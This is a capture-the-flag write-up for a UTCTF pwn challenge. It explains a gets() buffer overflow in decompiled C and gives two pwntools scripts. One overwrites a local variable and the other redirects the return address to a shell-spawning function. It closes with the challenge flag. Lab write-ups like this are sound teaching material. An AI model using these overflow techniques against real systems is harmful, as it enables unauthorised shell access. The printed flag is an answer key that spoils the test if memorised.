# Challenge - AAAAAAAAAAAAAAAA

## Category - General

I had the unintended solve on this challenge, by looking at the code we can easily see that we have a buffer overflow beacuse of gets() in main() -

```c

undefined8 main(void)

{
  char i [111];
  char j;

  j = '\0';
  gets(local_78);
  if (j == 'B') {
    get_flag();
  }
  return 0;
}
```

and the get_flag function -

```c

void get_flag(void)

{
  char *local_18;
  undefined8 local_10;

  local_18 = "/bin/sh";
  local_10 = 0;
  execve("/bin/sh",&local_18,(char **)0x0);
  return;
}


```

so get_flag() gives us shell. We can see in main() that we have to overwrite `j` so that it's value is "B", if it's "B", it'll give us shell

Intended solve -

```py
from pwn import *
io = remote('pwn.utctf.live', 5000) # connect
io.sendline(b'A'*111 + b'B') # A * 111 because "i" variable can hold 111 characters
# after A we send B so that "j" variable is overwritten and it becomes "B"
io.interactive()
```

And as the result we get the shell

## Now the unintended solve

Instead of overwriting "j" variable to "B", beacuse of gets() I called the get_flag() function myself!

script -

```py
from pwn import *
elf = context.binary = ELF('./chall') # define elf beacuse we need it to call functions
io = remote('pwn.utctf.live', 5000) # connect
io.sendline(b'A'*120 + pack(elf.symbols.get_flag)) # 120 is the offset, we can find offset easily from gdb

# elf.symbols.get_flag to call get_flag function

io.interactive()
```

This also gives us the shell!

# Flag - utflag{you_expected_the_flag_to_be_screaming_but_it_was_me_dio98054042}
